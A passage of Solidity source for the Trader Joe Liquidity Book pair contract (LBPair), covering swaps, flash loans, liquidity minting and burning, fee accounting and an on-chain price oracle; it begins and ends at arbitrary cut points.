virtual returns (uint256);\n}\n\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/** Imports **/\n\nimport \"./LBErrors.sol\";\nimport \"./LBToken.sol\";\nimport \"./libraries/BinHelper.sol\";\nimport \"./libraries/Constants.sol\";\nimport \"./libraries/Decoder.sol\";\nimport \"./libraries/FeeDistributionHelper.sol\";\nimport \"./libraries/Math512Bits.sol\";\nimport \"./libraries/Oracle.sol\";\nimport \"./libraries/ReentrancyGuardUpgradeable.sol\";\nimport \"./libraries/SafeCast.sol\";\nimport \"./libraries/SafeMath.sol\";\nimport \"./libraries/SwapHelper.sol\";\nimport \"./libraries/TokenHelper.sol\";\nimport \"./libraries/TreeMath.sol\";\nimport \"./interfaces/ILBFlashLoanCallback.sol\";\nimport \"./interfaces/ILBPair.sol\";\n\n/// @title Liquidity Book Pair\n/// @author Trader Joe\n/// @notice The implementation of Liquidity Book Pair that also acts as the receipt token for liquidity positions\ncontract LBPair is LBToken, ReentrancyGuardUpgradeable, ILBPair {\n    /** Libraries **/\n\n    using Math512Bits for uint256;\n    using TreeMath for mapping(uint256 => uint256)[3];\n    using SafeCast for uint256;\n    using SafeMath for uint256;\n    using TokenHelper for IERC20;\n    using FeeHelper for FeeHelper.FeeParameters;\n    using SwapHelper for Bin;\n    using Decoder for bytes32;\n    using FeeDistributionHelper for FeeHelper.FeesDistribution;\n    using Oracle for bytes32[65_535];\n\n    /** Modifiers **/\n\n    modifier onlyFactory() {\n        if (msg.sender != address(factory)) revert LBPair__OnlyFactory();\n        _;\n    }\n\n    /** Public immutable variables **/\n\n    ILBFactory public immutable override factory;\n\n    /** Public variables **/\n\n    IERC20 public override tokenX;\n    IERC20 public override tokenY;\n\n    /** Private variables **/\n\n    PairInformation private _pairInformation;\n    FeeHelper.FeeParameters private _feeParameters;\n    /// @dev The reserves of tokens for every bin. This is the amount\n    /// of tokenY if `id < _pairInformation.activeId`; of tokenX if `id > _pairInformation.activeId`\n    /// and a mix of both if `id == _pairInformation.activeId`\n    mapping(uint256 => Bin) private _bins;\n    /// @dev Tree to find bins with non zero liquidity\n    mapping(uint256 => uint256)[3] private _tree;\n    /// @dev Mapping from account to user's unclaimed fees. The first 128 bits are tokenX and the last are for tokenY\n    mapping(address => bytes32) private _unclaimedFees;\n    /// @dev Mapping from account to id to user's accruedDebt.\n    mapping(address => mapping(uint256 => Debts)) private _accruedDebts;\n    /// @dev Oracle array\n    bytes32[65_535] private _oracle;\n\n    /** OffSets */\n\n    uint256 private constant _OFFSET_PAIR_RESERVE_X = 24;\n    uint256 private constant _OFFSET_PROTOCOL_FEE = 128;\n    uint256 private constant _OFFSET_BIN_RESERVE_Y = 112;\n    uint256 private constant _OFFSET_VARIABLE_FEE_PARAMETERS = 144;\n    uint256 private constant _OFFSET_ORACLE_SAMPLE_LIFETIME = 136;\n    uint256 private constant _OFFSET_ORACLE_SIZE = 152;\n    uint256 private constant _OFFSET_ORACLE_ACTIVE_SIZE = 168;\n    uint256 private constant _OFFSET_ORACLE_LAST_TIMESTAMP = 184;\n    uint256 private constant _OFFSET_ORACLE_ID = 224;\n\n    /** Constructor **/\n\n    /// @notice Set the factory address\n    /// @param _factory The address of the factory\n    constructor(ILBFactory _factory) LBToken() {\n        if (address(_factory) == address(0)) revert LBPair__AddressZero();\n        factory = _factory;\n    }\n\n    /// @notice Initialize the parameters of the LBPair\n    /// @dev The different parameters needs to be validated very cautiously.\n    /// It is highly recommended to never call this function directly, use the factory\n    /// as it validates the different parameters\n    /// @param _tokenX The address of the tokenX. Can't be address 0\n    /// @param _tokenY The address of the tokenY. Can't be address 0\n    /// @param _activeId The active id of the pair\n    /// @param _sampleLifetime The lifetime of a sample. It's the min time between 2 oracle's sample\n    /// @param _packedFeeParameters The fee parameters packed in a single 256 bits slot\n    function initialize(\n        IERC20 _tokenX,\n        IERC20 _tokenY,\n        uint24 _activeId,\n        uint16 _sampleLifetime,\n        bytes32 _packedFeeParameters\n    ) external override onlyFactory {\n        if (address(_tokenX) == address(0) || address(_tokenY) == address(0)) revert LBPair__AddressZero();\n        if (address(tokenX) != address(0)) revert LBPair__AlreadyInitialized();\n\n        __ReentrancyGuard_init();\n\n        tokenX = _tokenX;\n        tokenY = _tokenY;\n\n        _pairInformation.activeId = _activeId;\n        _pairInformation.oracleSampleLifetime = _sampleLifetime;\n\n        _setFeesParameters(_packedFeeParameters);\n        _increaseOracle(2);\n    }\n\n    /** External View Functions **/\n\n    /// @notice View function to get the reserves and active id\n    /// @return reserveX The reserve of asset X\n    /// @return reserveY The reserve of asset Y\n    /// @return activeId The active id of the pair\n    function getReservesAndId()\n        external\n        view\n        override\n        returns (\n            uint256 reserveX,\n            uint256 reserveY,\n            uint256 activeId\n        )\n    {\n        return _getReservesAndId();\n    }\n\n    /// @notice View function to get the global fees information, the total fees and those for protocol\n    /// @dev The fees for users are `total - protocol`\n    /// @return feesXTotal The total fees of asset X\n    /// @return feesYTotal The total fees of asset Y\n    /// @return feesXProtocol The protocol fees of asset X\n    /// @return feesYProtocol The protocol fees of asset Y\n    function getGlobalFees()\n        external\n        view\n        override\n        returns (\n            uint256 feesXTotal,\n            uint256 feesYTotal,\n            uint256 feesXProtocol,\n            uint256 feesYProtocol\n        )\n    {\n        return _getGlobalFees();\n    }\n\n    /// @notice View function to get the oracle parameters\n    /// @return oracleSampleLifetime The lifetime of a sample, it accumulates information for up to this timestamp\n    /// @return oracleSize The size of the oracle (last ids can be empty)\n    /// @return oracleActiveSize The active size of the oracle (no empty data)\n    /// @return oracleLastTimestamp The timestamp of the creation of the oracle's latest sample\n    /// @return oracleId The index of the oracle's latest sample\n    /// @return min The min delta time of two samples\n    /// @return max The safe max delta time of two samples\n    function getOracleParameters()\n        external\n        view\n        override\n        returns (\n            uint256 oracleSampleLifetime,\n            uint256 oracleSize,\n            uint256 oracleActiveSize,\n            uint256 oracleLastTimestamp,\n            uint256 oracleId,\n            uint256 min,\n            uint256 max\n        )\n    {\n        (oracleSampleLifetime, oracleSize, oracleActiveSize, oracleLastTimestamp, oracleId) = _getOracleParameters();\n        min = oracleActiveSize == 0 ? 0 : oracleSampleLifetime;\n        max = oracleSampleLifetime * oracleActiveSize;\n    }\n\n    /// @notice View function to get the oracle's sample at `_timeDelta` seconds\n    /// @dev Return a linearized sample, the weighted average of 2 neighboring samples\n    /// @param _timeDelta The number of seconds before the current timestamp\n    /// @return cumulativeId The weighted average cumulative id\n    /// @return cumulativeVolatilityAccumulated The weighted average cumulative volatility accumulated\n    /// @return cumulativeBinCrossed The weighted average cumulative bin crossed\n    function getOracleSampleFrom(uint256 _timeDelta)\n        external\n        view\n        override\n        returns (\n            uint256 cumulativeId,\n            uint256 cumulativeVolatilityAccumulated,\n            uint256 cumulativeBinCrossed\n        )\n    {\n        uint256 _lookUpTimestamp = block.timestamp - _timeDelta;\n\n        (, , uint256 _oracleActiveSize, , uint256 _oracleId) = _getOracleParameters();\n\n        uint256 timestamp;\n        (timestamp, cumulativeId, cumulativeVolatilityAccumulated, cumulativeBinCrossed) = _oracle.getSampleAt(\n            _oracleActiveSize,\n            _oracleId,\n            _lookUpTimestamp\n        );\n\n        if (timestamp < _lookUpTimestamp) {\n            FeeHelper.FeeParameters memory _fp = _feeParameters;\n            uint256 _activeId = _pairInformation.activeId;\n            _fp.updateVariableFeeParameters(_activeId);\n\n            unchecked {\n                uint256 _deltaT = _lookUpTimestamp - timestamp;\n\n                cumulativeId += _activeId * _deltaT;\n                cumulativeVolatilityAccumulated += uint256(_fp.volatilityAccumulated) * _deltaT;\n            }\n        }\n    }\n\n    /// @notice View function to get the fee parameters\n    /// @return The fee parameters\n    function feeParameters() external view override returns (FeeHelper.FeeParameters memory) {\n        return _feeParameters;\n    }\n\n    /// @notice View function to get the first bin that isn't empty, will not be `_id` itself\n    /// @param _id The bin id\n    /// @param _swapForY Whether you've swapping token X for token Y (true) or token Y for token X (false)\n    /// @return The id of the non empty bin\n    function findFirstNonEmptyBinId(uint24 _id, bool _swapForY) external view override returns (uint24) {\n        return _tree.findFirstBin(_id, _swapForY);\n    }\n\n    /// @notice View function to get the bin at `id`\n    /// @param _id The bin id\n    /// @return reserveX The reserve of tokenX of the bin\n    /// @return reserveY The reserve of tokenY of the bin\n    function getBin(uint24 _id) external view override returns (uint256 reserveX, uint256 reserveY) {\n        return _getBin(_id);\n    }\n\n    /// @notice View function to get the pending fees of a user\n    /// @dev The array must be strictly increasing to ensure uniqueness\n    /// @param _account The address of the user\n    /// @param _ids The list of ids\n    /// @return amountX The amount of tokenX pending\n    /// @return amountY The amount of tokenY pending\n    function pendingFees(address _account, uint256[] memory _ids)\n        external\n        view\n        override\n        returns (uint256 amountX, uint256 amountY)\n    {\n        bytes32 _unclaimedData = _unclaimedFees[_account];\n\n        amountX = _unclaimedData.decode(type(uint128).max, 0);\n        amountY = _unclaimedData.decode(type(uint128).max, 128);\n\n        uint256 _lastId;\n        unchecked {\n            for (uint256 i; i < _ids.length; ++i) {\n                uint256 _id = _ids[i];\n\n                // Ensures uniqueness of ids\n                if (_lastId >= _id && i != 0) revert LBPair__OnlyStrictlyIncreasingId();\n\n                uint256 _balance = balanceOf(_account, _id);\n\n                if (_balance != 0) {\n                    Bin memory _bin = _bins[_id];\n\n                    (uint256 _amountX, uint256 _amountY) = _getPendingFees(_bin, _account, _id, _balance);\n\n                    amountX += _amountX;\n                    amountY += _amountY;\n                }\n\n                _lastId = _id;\n            }\n        }\n    }\n\n    /** External Functions **/\n\n    /// @notice Performs a low level swap, this needs to be called from a contract which performs important safety checks\n    /// @dev Will swap the full amount that this contract received of token X or Y\n    /// @param _swapForY whether the token sent was Y (true) or X (false)\n    /// @param _to The address of the recipient\n    /// @return amountXOut The amount of token X sent to `_to`\n    /// @return amountYOut The amount of token Y sent to `_to`\n    function swap(bool _swapForY, address _to)\n        external\n        override\n        nonReentrant\n        returns (uint256 amountXOut, uint256 amountYOut)\n    {\n        PairInformation memory _pair = _pairInformation;\n\n        uint256 _amountIn = _swapForY\n            ? tokenX.received(_pair.reserveX, _pair.feesX.total)\n            : tokenY.received(_pair.reserveY, _pair.feesY.total);\n\n        if (_amountIn == 0) revert LBPair__InsufficientAmounts();\n\n        FeeHelper.FeeParameters memory _fp = _feeParameters;\n        _fp.updateVariableFeeParameters(_pair.activeId);\n        uint256 _startId = _pair.activeId;\n\n        uint256 _amountOut;\n        // Performs the actual swap, bin per bin\n        // It uses the findFirstBin function to make sure the bin we're currently looking at\n        // has liquidity in it.\n        while (true) {\n            Bin memory _bin = _bins[_pair.activeId];\n            if ((!_swapForY && _bin.reserveX != 0) || (_swapForY && _bin.reserveY != 0)) {\n                (uint256 _amountInToBin, uint256 _amountOutOfBin, FeeHelper.FeesDistribution memory _fees) = _bin\n                    .getAmounts(_fp, _pair.activeId, _swapForY, _amountIn);\n\n                _bin.updateFees(_swapForY ? _pair.feesX : _pair.feesY, _fees, _swapForY, totalSupply(_pair.activeId));\n\n                _bin.updateReserves(_pair, _swapForY, _amountInToBin.safe112(), _amountOutOfBin.safe112());\n\n                _amountIn -= _amountInToBin + _fees.total;\n                _amountOut += _amountOutOfBin;\n\n                _bins[_pair.activeId] = _bin;\n\n                if (_swapForY) {\n                    emit Swap(\n                        msg.sender,\n                        _to,\n                        _pair.activeId,\n                        _amountInToBin,\n                        0,\n                        0,\n                        _amountOutOfBin,\n                        _fp.volatilityAccumulated,\n                        _fees.total,\n                        0\n                    );\n                } else {\n                    emit Swap(\n                        msg.sender,\n                        _to,\n                        _pair.activeId,\n                        0,\n                        _amountInToBin,\n                        _amountOutOfBin,\n                        0,\n                        _fp.volatilityAccumulated,\n                        0,\n                        _fees.total\n                    );\n                }\n            }\n\n            if (_amountIn != 0) {\n                _pair.activeId = _tree.findFirstBin(_pair.activeId, _swapForY);\n            } else {\n                break;\n            }\n        }\n\n        if (_amountOut == 0) revert LBPair__BrokenSwapSafetyCheck(); // Safety check\n\n        // We use oracleSize so it can start filling empty slot that were added recently\n        uint256 _updatedOracleId = _oracle.update(\n            _pair.oracleSize,\n            _pair.oracleSampleLifetime,\n            _pair.oracleLastTimestamp,\n            _pair.oracleId,\n            _pair.activeId,\n            _fp.volatilityAccumulated,\n            _startId.absSub(_pair.activeId)\n        );\n\n        // We update the oracleId and lastTimestamp if the sample write on another slot\n        if (_updatedOracleId != _pair.oracleId || _pair.oracleLastTimestamp == 0) {\n            // Can't overflow as the updatedOracleId < oracleSize\n            _pair.oracleId = uint16(_updatedOracleId);\n            _pair.oracleLastTimestamp = block.timestamp.safe40();\n\n            // We increase the activeSize if the updated sample is written in a new slot\n            // Can't overflow as _updatedOracleId < maxSize = 2**16-1\n            unchecked {\n                if (_updatedOracleId == _pair.oracleActiveSize) ++_pair.oracleActiveSize;\n            }\n        }\n\n        _feeParameters = _fp;\n        _pairInformation = _pair;\n\n        if (_swapForY) {\n            amountYOut = _amountOut;\n            tokenY.safeTransfer(_to, _amountOut);\n        } else {\n            amountXOut = _amountOut;\n            tokenX.safeTransfer(_to, _amountOut);\n        }\n    }\n\n    /// @notice Performs a flash loan\n    /// @param _to the address that will execute the external call\n    /// @param _amountXOut The amount of tokenX\n    /// @param _amountYOut The amount of tokenY\n    /// @param _data The bytes data that will be forwarded to _to\n    function flashLoan(\n        address _to,\n        uint256 _amountXOut,\n        uint256 _amountYOut,\n        bytes calldata _data\n    ) external override nonReentrant {\n        FeeHelper.FeeParameters memory _fp = _feeParameters;\n\n        uint256 _fee = factory.flashLoanFee();\n\n        FeeHelper.FeesDistribution memory _feesX = _fp.getFeeAmountDistribution(_getFlashLoanFee(_amountXOut, _fee));\n        FeeHelper.FeesDistribution memory _feesY = _fp.getFeeAmountDistribution(_getFlashLoanFee(_amountYOut, _fee));\n\n        (uint256 _reserveX, uint256 _reserveY, uint256 _id) = _getReservesAndId();\n\n        tokenX.safeTransfer(_to, _amountXOut);\n        tokenY.safeTransfer(_to, _amountYOut);\n\n        ILBFlashLoanCallback(_to).LBFlashLoanCallback(\n            msg.sender,\n            _amountXOut,\n            _amountYOut,\n            _feesX.total,\n            _feesY.total,\n            _data\n        );\n\n        _feesX.flashLoanHelper(_pairInformation.feesX, tokenX, _reserveX);\n        _feesY.flashLoanHelper(_pairInformation.feesY, tokenY, _reserveY);\n\n        uint256 _totalSupply = totalSupply(_id);\n\n        _bins[_id].accTokenXPerShare += _feesX.getTokenPerShare(_totalSupply);\n        _bins[_id].accTokenYPerShare += _feesY.getTokenPerShare(_totalSupply);\n\n        emit FlashLoan(msg.sender, _to, _amountXOut, _amountYOut, _feesX.total, _feesY.total);\n    }\n\n    /// @notice Performs a low level add, this needs to be called from a contract which performs important safety checks.\n    /// @param _ids The list of ids to add liquidity\n    /// @param _distributionX The distribution of tokenX with sum(_distributionX) = 1e18 (100%) or 0 (0%)\n    /// @param _distributionY The distribution of tokenY with sum(_distributionY) = 1e18 (100%) or 0 (0%)\n    /// @param _to The address of the recipient\n    /// @return The amount of token X that was added to the pair\n    /// @return The amount of token Y that was added to the pair\n    /// @return liquidityMinted Amount of LBToken minted\n    function mint(\n        uint256[] memory _ids,\n        uint256[] memory _distributionX,\n        uint256[] memory _distributionY,\n        address _to\n    )\n        external\n        override\n        nonReentrant\n        returns (\n            uint256,\n            uint256,\n            uint256[] memory liquidityMinted\n        )\n    {\n        if (_ids.length == 0 || _ids.length != _distributionX.length || _ids.length != _distributionY.length)\n            revert LBPair__WrongLengths();\n\n        PairInformation memory _pair = _pairInformation;\n\n        FeeHelper.FeeParameters memory _fp = _feeParameters;\n\n        MintInfo memory _mintInfo;\n\n        _mintInfo.amountXIn = tokenX.received(_pair.reserveX, _pair.feesX.total).safe128();\n        _mintInfo.amountYIn = tokenY.received(_pair.reserveY, _pair.feesY.total).safe128();\n\n        liquidityMinted = new uint256[](_ids.length);\n\n        unchecked {\n            for (uint256 i; i < _ids.length; ++i) {\n                _mintInfo.id = _ids[i].safe24();\n                Bin memory _bin = _bins[_mintInfo.id];\n\n                if (_bin.reserveX == 0 && _bin.reserveY == 0) _tree.addToTree(_mintInfo.id);\n\n                _mintInfo.distributionX = _distributionX[i];\n                _mintInfo.distributionY = _distributionY[i];\n\n                if (\n                    _mintInfo.distributionX > Constants.PRECISION ||\n                    _mintInfo.distributionY > Constants.PRECISION ||\n                    (_mintInfo.totalDistributionX += _mintInfo.distributionX) > Constants.PRECISION ||\n                    (_mintInfo.totalDistributionY += _mintInfo.distributionY) > Constants.PRECISION\n                ) revert LBPair__DistributionsOverflow();\n\n                // Can't overflow as amounts are uint128 and distributions are smaller or equal to 1e18\n                _mintInfo.amountX = (_mintInfo.amountXIn * _mintInfo.distributionX) / Constants.PRECISION;\n                _mintInfo.amountY = (_mintInfo.amountYIn * _mintInfo.distributionY) / Constants.PRECISION;\n\n                uint256 _price = BinHelper.getPriceFromId(_mintInfo.id, _fp.binStep);\n                if (_mintInfo.id >= _pair.activeId) {\n                    if (_mintInfo.id == _pair.activeId) {\n                        uint256 _totalSupply = totalSupply(_mintInfo.id);\n\n                        uint256 _userL = _price.mulShiftRoundDown(_mintInfo.amountX, Constants.SCALE_OFFSET) +\n                            _mintInfo.amountY;\n\n                        uint256 _receivedX;\n                        uint256 _receivedY;\n                        {\n                            uint256 _supply = _totalSupply + _userL;\n                            _receivedX = (_userL * (uint256(_bin.reserveX) + _mintInfo.amountX)) / _supply;\n                            _receivedY = (_userL * (uint256(_bin.reserveY) + _mintInfo.amountY)) / _supply;\n                        }\n\n                        _fp.updateVariableFeeParameters(_mintInfo.id);\n\n                        if (_mintInfo.amountX > _receivedX) {\n                            FeeHelper.FeesDistribution memory _fees = _fp.getFeeAmountDistribution(\n                                _fp.getFeeAmountForC(_mintInfo.amountX - _receivedX)\n                            );\n\n                            _mintInfo.amountX -= _fees.total;\n                            _mintInfo.activeFeeX += _fees.total;\n\n                            _bin.updateFees(_pair.feesX, _fees, true, _totalSupply);\n\n                            emit CompositionFee(msg.sender, _to, _mintInfo.id, _fees.total, 0);\n                        } else if (_mintInfo.amountY > _receivedY) {\n                            FeeHelper.FeesDistribution memory _fees = _fp.getFeeAmountDistribution(\n                                _fp.getFeeAmountForC(_mintInfo.amountY - _receivedY)\n                            );\n\n                            _mintInfo.amountY -= _fees.total;\n                            _mintInfo.activeFeeY += _fees.total;\n\n                            _bin.updateFees(_pair.feesY, _fees, false, _totalSupply);\n\n                            emit CompositionFee(msg.sender, _to, _mintInfo.id, 0, _fees.total);\n                        }\n                    } else if (_mintInfo.amountY != 0) revert LBPair__CompositionFactorFlawed(_mintInfo.id);\n                } else if (_mintInfo.amountX != 0) revert LBPair__CompositionFactorFlawed(_mintInfo.id);\n\n                uint256 _liquidity = _price.mulShiftRoundDown(_mintInfo.amountX, Constants.SCALE_OFFSET) +\n                    _mintInfo.amountY;\n\n                if (_liquidity == 0) revert LBPair__InsufficientLiquidityMinted(_mintInfo.id);\n\n                liquidityMinted[i] = _liquidity;\n\n                // The addition can't overflow as the amounts are checked to be uint128 and the reserves are uint112\n                _bin.reserveX = (_mintInfo.amountX + _bin.reserveX).safe112();\n                _bin.reserveY = (_mintInfo.amountY + _bin.reserveY).safe112();\n\n                // The addition or the cast can't overflow as it would have reverted during the L568 and L569 if amounts were greater than uint112\n                _pair.reserveX += uint112(_mintInfo.amountX);\n                _pair.reserveY += uint112(_mintInfo.amountY);\n\n                _mintInfo.amountXAddedToPair += _mintInfo.amountX;\n                _mintInfo.amountYAddedToPair += _mintInfo.amountY;\n\n                _bins[_mintInfo.id] = _bin;\n                _mint(_to, _mintInfo.id, _liquidity);\n\n                emit LiquidityAdded(\n                    msg.sender,\n                    _to,\n                    _mintInfo.id,\n                    _liquidity,\n                    _mintInfo.amountX,\n                    _mintInfo.amountY,\n                    _mintInfo.distributionX,\n                    _mintInfo.distributionY\n                );\n            }\n\n            _pairInformation = _pair;\n\n            uint256 _amountAddedPlusFee = _mintInfo.amountXAddedToPair + _mintInfo.activeFeeX;\n            // If user sent too much tokens, We send them back the excess\n            if (_mintInfo.amountXIn > _amountAddedPlusFee) {\n                tokenX.safeTransfer(_to, _mintInfo.amountXIn - _amountAddedPlusFee);\n            }\n\n            _amountAddedPlusFee = _mintInfo.amountYAddedToPair + _mintInfo.activeFeeY;\n            if (_mintInfo.amountYIn > _amountAddedPlusFee) {\n                tokenY.safeTransfer(_to, _mintInfo.amountYIn - _amountAddedPlusFee);\n            }\n        }\n\n        return (_mintInfo.amountXAddedToPair, _mintInfo.amountYAddedToPair, liquidityMinted);\n    }\n\n    /// @notice Performs a low level remove, this needs to be called from a contract which performs important safety checks\n    /// @param _ids The ids the user want to remove its liquidity\n    /// @param _amounts The amount of token to burn\n    /// @param _to The address of the recipient\n    /// @return amountX The amount of token X sent to `_to`\n    /// @return amountY The amount of token Y sent to `_to`\n    function burn(\n        uint256[] memory _ids,\n        uint256[] memory _amounts,\n        address _to\n    ) external override nonReentrant returns (uint256 amountX, uint256 amountY) {\n        (uint256 _pairReserveX, uint256 _pairReserveY, uint256 _activeId) = _getReservesAndId();\n        unchecked {\n            for (uint256 i; i < _ids.length; ++i) {\n                uint24 _id = _ids[i].safe24();\n                uint256 _amountToBurn = _amounts[i];\n\n                if (_amountToBurn == 0) revert LBPair__InsufficientLiquidityBurned(_id);\n\n                (uint256 _reserveX, uint256 _reserveY) = _getBin(_id);\n\n                uint256 _totalSupply = totalSupply(_id);\n\n                uint256 _amountX;\n                uint256 _amountY;\n\n                if (_id <= _activeId) {\n                    _amountY = _amountToBurn.mulDivRoundDown(_reserveY, _totalSupply);\n\n                    amountY += _amountY;\n                    _reserveY -= _amountY;\n                    _pairReserveY -= _amountY;\n                }\n                if (_id >= _activeId) {\n                    _amountX = _amountToBurn.mulDivRoundDown(_reserveX, _totalSupply);\n\n                    amountX += _amountX;\n                    _reserveX -= _amountX;\n                    _pairReserveX -= _amountX;\n                }\n\n                if (_reserveX == 0 && _reserveY == 0) _tree.removeFromTree(_id);\n\n                // Optimized `_bins[_id] = _bin` to do only 1 sstore\n                assembly {\n                    mstore(0, _id)\n                    mstore(32, _bins.slot)\n                    let slot := keccak256(0, 64)\n\n                    let reserves := add(shl(_OFFSET_BIN_RESERVE_Y, _reserveY), _reserveX)\n                    sstore(slot, reserves)\n                }\n\n                _burn(address(this), _id, _amountToBurn);\n\n                emit LiquidityRemoved(msg.sender, _to, _id, _amountToBurn, _amountX, _amountY);\n            }\n        }\n\n        // Optimization to do only 2 sstore\n        _pairInformation.reserveX = uint136(_pairReserveX);\n        _pairInformation.reserveY = uint136(_pairReserveY);\n\n        tokenX.safeTransfer(_to, amountX);\n        tokenY.safeTransfer(_to, amountY);\n    }\n\n    /// @notice Increase the length of the oracle\n    /// @param _newSize The new size of the oracle. Needs to be bigger than current one\n    function increaseOracleLength(uint16 _newSize) external override {\n        _increaseOracle(_newSize);\n    }\n\n    /// @notice Collect fees of an user\n    /// @param _account The address of the user\n    /// @param _ids The list of bin ids to collect fees in\n    /// @return amountX The amount of tokenX claimed\n    /// @return amountY The amount of tokenY claimed\n    function collectFees(address _account, uint256[] memory _ids)\n        external\n        override\n        nonReentrant\n        returns (uint256 amountX, uint256 amountY)\n    {\n        unchecked {\n            bytes32 _unclaimedData = _unclaimedFees[_account];\n            delete _unclaimedFees[_account];\n\n            amountX = _unclaimedData.decode(type(uint128).max, 0);\n            amountY = _unclaimedData.decode(type(uint128).max, 128);\n\n            for (uint256 i; i < _ids.length; ++i) {\n                uint256 _id = _ids[i];\n                uint256 _balance = balanceOf(_account, _id);\n\n                if (_balance != 0) {\n                    Bin memory _bin = _bins[_id];\n\n                    (uint256 _amountX, uint256 _amountY) = _getPendingFees(_bin, _account, _id, _balance);\n                    _updateUserDebts(_bin, _account, _id, _balance);\n\n                    amountX += _amountX;\n                    amountY += _amountY;\n                }\n            }\n\n            if (amountX != 0) {\n                _pairInformation.feesX.total -= uint128(amountX);\n            }\n            if (amountY != 0) {\n                _pairInformation.feesY.total -= uint128(amountY);\n            }\n\n            tokenX.safeTransfer(_account, amountX);\n            tokenY.safeTransfer(_account, amountY);\n\n            emit FeesCollected(msg.sender, _account, amountX, amountY);\n        }\n    }\n\n    /// @notice Collect the protocol fees and send them to the feeRecipient\n    /// @dev The balances are not zeroed to save gas by not resetting the storage slot\n    /// Only callable by the fee recipient\n    /// @return amountX The amount of tokenX claimed\n    /// @return amountY The amount of tokenY claimed\n    function collectProtocolFees() external override nonReentrant returns (uint256 amountX, uint256 amountY) {\n        unchecked {\n            address _feeRecipient = factory.feeRecipient();\n\n            if (msg.sender != _feeRecipient) revert LBPair__OnlyFeeRecipient(_feeRecipient, msg.sender);\n\n            // The fees returned can't be greater than uint128, so the assembly blocks are safe\n            (\n                uint256 _feesXTotal,\n                uint256 _feesYTotal,\n                uint256 _feesXProtocol,\n                uint256 _feesYProtocol\n            ) = _getGlobalFees();\n\n            if (_feesXProtocol > 1) {\n                amountX = _feesXProtocol - 1;\n                _feesXTotal -= amountX;\n\n                // Assembly block that does:\n                // _pairInformation.feesX = FeeHelper.FeesDistribution({total: _feesXTotal, protocol: 1});\n                assembly {\n                    let _slotX := add(_pairInformation.slot, 2)\n\n                    sstore(_slotX, add(shl(_OFFSET_PROTOCOL_FEE, 1), _feesXTotal))\n                }\n\n                tokenX.safeTransfer(_feeRecipient, amountX);\n            }\n\n            if (_feesYProtocol > 1) {\n                amountY = _feesYProtocol - 1;\n                _feesYTotal -= amountY;\n\n                // Assembly block that does:\n                // _pairInformation.feesY = FeeHelper.FeesDistribution({total: _feesYTotal, protocol: 1});\n                assembly {\n                    let _slotY := add(_pairInformation.slot, 3)\n\n                    sstore(_slotY, add(shl(_OFFSET_PROTOCOL_FEE, 1), _feesYTotal))\n                }\n\n                tokenY.safeTransfer(_feeRecipient, amountY);\n            }\n\n            emit ProtocolFeesCollected(msg.sender, _feeRecipient, amountX, amountY);\n        }\n    }\n\n    /// @notice Set the fees parameters\n    /// @dev Needs to be called by the factory that will validate the values\n    /// The bin step will not change\n    /// Only callable by the factory\n    /// @param _packedFeeParameters The packed fee parameters\n    function setFeesParameters(bytes32 _packedFeeParameters) external override onlyFactory {\n        _setFeesParameters(_packedFeeParameters);\n    }\n\n    function forceDecay() external override onlyFactory {\n        unchecked {\n            _feeParameters.volatilityReference = uint24(\n                (uint256(_feeParameters.reductionFactor) * _feeParameters.volatilityReference) /\n                    Constants.BASIS_POINT_MAX\n            );\n        }\n    }\n\n    /** Internal Functions **/\n\n    /// @notice Collect and update fees before any token transfer, mint or burn\n    /// @param _from The address of the owner of the token\n    /// @param _to The address of the recipient of the  token\n    /// @param _id The id of the token\n    /// @param _amount The amount of token of type `id`\n    function _beforeTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _id,\n        uint256 _amount\n    ) internal override(LBToken) {\n        unchecked {\n            super._beforeTokenTransfer(_from, _to, _id, _amount);\n\n            Bin memory _bin = _bins[_id];\n\n            if (_from != _to) {\n                if (_from != address(0) && _from != address(this)) {\n                    uint256 _balanceFrom = balanceOf(_from, _id);\n\n                    _cacheFees(_bin, _from, _id, _balanceFrom, _balanceFrom - _amount);\n                }\n\n                if (_to != address(0) && _to != address(this)) {\n                    uint256 _balanceTo = balanceOf(_to, _id);\n\n                    _cacheFees(_bin, _to, _id, _balanceTo, _balanceTo + _amount);\n                }\n            }\n        }\n    }\n\n    /** Private Functions **/\n\n    /// @notice View function to get the pending fees of an account on a given bin\n    /// @param _bin  The bin where the user is collecting fees\n    /// @param _account The address of the user\n    /// @param _id The id where the user is collecting fees\n    /// @param _balance The previous balance of the user\n    /// @return amountX The amount of tokenX pending for the account\n    /// @return amountY The amount of tokenY pending for the account\n    function _getPendingFees(\n        Bin memory _bin,\n        address _account,\n        uint256 _id,\n        uint256 _balance\n    ) private view returns (uint256 amountX, uint256 amountY) {\n        Debts memory _debts = _accruedDebts[_account][_id];\n\n        amountX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtX;\n        amountY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtY;\n    }\n\n    /// @notice Update fees of a given user\n    /// @param _bin The bin where the user has collected fees\n    /// @param _account The address of the user\n    /// @param _id The id where the user has collected fees\n    /// @param _balance The new balance of the user\n    function _updateUserDebts(\n        Bin memory _bin,\n        address _account,\n        uint256 _id,\n        uint256 _balance\n    ) private {\n        uint256 _debtX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);\n        uint256 _debtY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);\n\n        _accruedDebts[_account][_id].debtX = _debtX;\n        _accruedDebts[_account][_id].debtY = _debtY;\n    }\n\n    /// @notice Update the unclaimed fees of a given user before a transfer\n    /// @param _bin The bin where the user has collected fees\n    /// @param _user The address of the user\n    /// @param _id The id where the user has collected fees\n    /// @param _previousBalance The previous balance of the user\n    /// @param _newBalance The new balance of the user\n    function _cacheFees(\n        Bin memory _bin,\n        address _user,\n        uint256 _id,\n        uint256 _previousBalance,\n        uint256 _newBalance\n    ) private {\n        unchecked {\n            bytes32 _unclaimedData = _unclaimedFees[_user];\n\n            uint256 amountX = _unclaimedData.decode(type(uint128).max, 0);\n            uint256 amountY = _unclaimedData.decode(type(uint128).max, 128);\n\n            (uint256 _amountX, uint256 _amountY) = _getPendingFees(_bin, _user, _id, _previousBalance);\n            _updateUserDebts(_bin, _user, _id, _newBalance);\n\n            (amountX += _amountX).safe128();\n            (amountY += _amountY).safe128();\n\n            _unclaimedFees[_user] = bytes32((amountY << 128) | amountX);\n        }\n    }\n\n    /// @notice Internal function to set the fee parameters of the 